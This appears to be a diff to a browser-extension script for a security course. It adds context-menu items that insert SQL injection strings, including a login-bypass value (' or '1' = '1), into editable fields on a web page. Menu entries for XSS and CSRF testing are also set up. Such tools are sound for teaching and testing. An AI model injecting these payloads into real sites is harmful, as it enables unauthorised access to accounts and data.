@@ -5,14 +5,20 @@
 // A generic onclick callback function.
 function genericOnClick(info, tab) {
   //    alert("item " + info.menuItemId + " was clicked");
-  //    alert("info: " + JSON.stringify(info));
+  //    alert("info: " + JSON.stringify(info));info: {"editable":true,"menuItemId":551,"pageUrl":"http://hugh.comp.nus.edu.sg/cs2107/demo1/grades.php?matric=a0111889w&method=1","parentMenuItemId":548}
   //    alert("tab: " + JSON.stringify(tab));
 }
+var payload = [
+    ["sql1","';--"],
+    ["sql2","' or '1' = '1"]
+];
 
-function sqlOnClick(info,tab){
-    alert("item " + info.menuItemId + " was clicked");
-    alert("info: " + JSON.stringify(info));
-    alert("tab: " + JSON.stringify(tab));
+function sqlOnClick(type,info,tab) {
+    payload.forEach(function(payloads){
+       if (type == payloads[0]) {
+           chrome.tabs.sendRequest(tab.id,payloads[1]);
+       } 
+    });
 }
 
 // Create one test item for each context type.
@@ -22,8 +28,8 @@ var xsrf = chrome.contextMenus.create({"title": "Cross-site Request Forgery","co
 
 //makes into array for easier editing in future.
 var sqlchild = [
-    {"title": "Test for vulnerability", "parentId": sql, "onclick": sqlOnClick,"contexts":["editable"]},
-    {"title": "Login Field", "parentId": sql, "onclick": sqlOnClick,"contexts":["editable"]}
+    {"title": "Test for vulnerability", "parentId": sql, "onclick": function(info, tab){sqlOnClick("sql1",info,tab)},"contexts":["editable"]},
+    {"title": "Login Field", "parentId": sql, "onclick": function(info, tab){sqlOnClick("sql2",info,tab)},"contexts":["editable"]}
 ];
 var xsschild = [
     {"title": "Test for vulnerability", "parentId": xss, "onclick": genericOnClick,"contexts":["editable"]},
